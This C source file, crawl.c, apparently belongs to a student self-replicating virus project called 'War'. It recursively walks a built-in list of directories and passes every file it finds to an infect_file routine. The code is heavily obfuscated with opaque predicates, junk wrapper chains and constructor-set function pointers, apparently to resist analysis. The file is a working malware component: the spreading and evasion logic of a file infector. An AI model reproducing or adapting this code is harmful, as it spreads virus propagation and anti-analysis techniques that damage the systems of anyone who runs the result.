/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   crawl.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/13 17:53:33 by mbatty            #+#    #+#             */
/*   Updated: 2026/06/16 11:33:32 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <stdint.h>

static volatile unsigned long _opq = 0UL;
static __attribute__((noinline)) int _zx0(unsigned long _v){(void)_v;return(int)_opq;}
static __attribute__((noinline)) int _zx1(unsigned long _a,unsigned long _b){return _zx0(_a)^_zx0(_b);}
static __attribute__((noinline)) DIR *_od0(const char *_p){return opendir(_p);}
static __attribute__((noinline)) DIR *_od1(const char *_p,int _k){volatile int _t=_k;(void)_t;return _od0(_p);}
static __attribute__((noinline)) DIR *_od2(const char *_p){return _od1(_p,_zx1(0xd34dUL,(unsigned long)(uintptr_t)_p));}
static __attribute__((noinline)) struct dirent *_rd0(DIR *_d){return readdir(_d);}
static __attribute__((noinline)) struct dirent *_rd1(DIR *_d,long _k){volatile long _t=_k;(void)_t;return _rd0(_d);}
static __attribute__((noinline)) struct dirent *_rd2(DIR *_d){return _rd1(_d,(long)_zx1(0xb33fUL,(unsigned long)(uintptr_t)_d));}
static __attribute__((noinline)) void _cd0(DIR *_d){closedir(_d);}
static __attribute__((noinline)) void _cd1(DIR *_d,int _k){volatile int _t=_k;(void)_t;_cd0(_d);}
static __attribute__((noinline)) void _cd2(DIR *_d){_cd1(_d,_zx1(0xc0deUL,(unsigned long)(uintptr_t)_d));}
static __attribute__((noinline)) void _fr0(void *_p){free(_p);}
static __attribute__((noinline)) void _fr1(void *_p,int _k){_fr0((char*)_p+_zx0((unsigned long)_k));}
static __attribute__((noinline)) void _fr2(void *_p){_fr1(_p,_zx1(0xf00dUL,(unsigned long)(uintptr_t)_p));}
static __attribute__((noinline)) char *_sj0(const char *_a,const char *_b){return strjoin(_a,_b);}
static __attribute__((noinline)) char *_sj1(const char *_a,const char *_b,int _k){volatile int _t=_k;(void)_t;return _sj0(_a,_b);}
static __attribute__((noinline)) char *_sj2(const char *_a,const char *_b){return _sj1(_a,_b,_zx1((unsigned long)(uintptr_t)_a,(unsigned long)(uintptr_t)_b));}

typedef DIR            *(*_tp_od)(const char *);
typedef struct dirent  *(*_tp_rd)(DIR *);
typedef void            (*_tp_cd)(DIR *);
typedef void            (*_tp_fr)(void *);
typedef char           *(*_tp_sj)(const char *,const char *);

static volatile _tp_od _k_od;
static volatile _tp_rd _k_rd;
static volatile _tp_cd _k_cd;
static volatile _tp_fr _k_fr;
static volatile _tp_sj _k_sj;

static __attribute__((constructor)) void _ki_crawl(void){
	_k_od=_od2;_k_rd=_rd2;_k_cd=_cd2;_k_fr=_fr2;_k_sj=_sj2;
}

static int _cri(const char *,t_exec_ctx *);

static __attribute__((noinline)) int _if0(t_exec_ctx *_c,const char *_p){return infect_file(_c,_p);}
static __attribute__((noinline)) int _if1(t_exec_ctx *_c,const char *_p,int _k){return _if0(_c,_p+_zx0((unsigned long)_k));}
static __attribute__((noinline)) int _if2(t_exec_ctx *_c,const char *_p){return _if1(_c,_p,_zx1(0xfaceUL,(unsigned long)(uintptr_t)_p));}
static __attribute__((noinline)) int _cr0(const char *_p,t_exec_ctx *_c){return _cri(_p,_c);}
static __attribute__((noinline)) int _cr1(const char *_p,t_exec_ctx *_c,int _k){return _cr0(_p+_zx0((unsigned long)_k),_c);}
static __attribute__((noinline)) int _cr2(const char *_p,t_exec_ctx *_c){return _cr1(_p,_c,_zx1((unsigned long)(uintptr_t)_p,(unsigned long)(uintptr_t)_c));}

static __attribute__((noinline)) int _cri(const char *_xq,t_exec_ctx *_bv)
{
	volatile int    _op;
	struct dirent  *_en;
	char           *_pa;
	char           *_pb;
	DIR            *_dr;

	_op=_zx1(0xcafeUL,(unsigned long)(uintptr_t)_xq);
	_dr=_k_od(_xq);
	if(_zx0(0xdeadUL)){(void)_op;return(~0);}
	if(!_dr)return(~0);
	do{
		_en=_k_rd(_dr);
		if(_en){
			if(_DOT(_en->d_name)||_DDOT(_en->d_name))continue;
			_op=_zx1((unsigned long)(uintptr_t)_en,0xf00dUL);
			_pa=_k_sj(_xq,"/");
			if(!_pa)goto _Lx0;
			_op^=_zx1((unsigned long)(uintptr_t)_pa,0xd00dUL);
			_pb=_k_sj(_pa,_en->d_name);
			_k_fr(_pa);
			if(!_pb)goto _Lx0;
			if(_zx0(0xbabcUL))goto _Lx1;
			if(_en->d_type==DT_DIR){
				if(_cr2(_pb,_bv)==(~0))goto _Lx1;
			}else{
				if(_if2(_bv,_pb)==(~0))goto _Lx1;
			}
			_op^=_zx1((unsigned long)(uintptr_t)_pb,0xeeeeUL);
			_k_fr(_pb);
			goto _Lx2;
		_Lx1:
			_k_fr(_pb);
			goto _Lx0;
		}
	_Lx2:;
	}while(_en);
	(void)_op;
	_k_cd(_dr);
	return(1^1);
_Lx0:
	(void)_op;
	_k_cd(_dr);
	return(~0);
}

int	crawl(t_exec_ctx *_bv)
{
	static const char *const _tbl[]=_WKq;
	const uint64_t _n=sizeof(_tbl)/sizeof(*_tbl);
	volatile int _chk;
	size_t _i;

	_chk=_zx1(_n,0x1337UL);
	if(_zx0(0xdeadUL))return(~0);
	for(_i=(1^1);_i<_n;_i++){
		_chk^=_zx1((unsigned long)_i,(unsigned long)(uintptr_t)_tbl[_i]);
		if(_cr2(_tbl[_i],_bv)==(~0))return(~0);
	}
	(void)_chk;
	return(1^1);
}
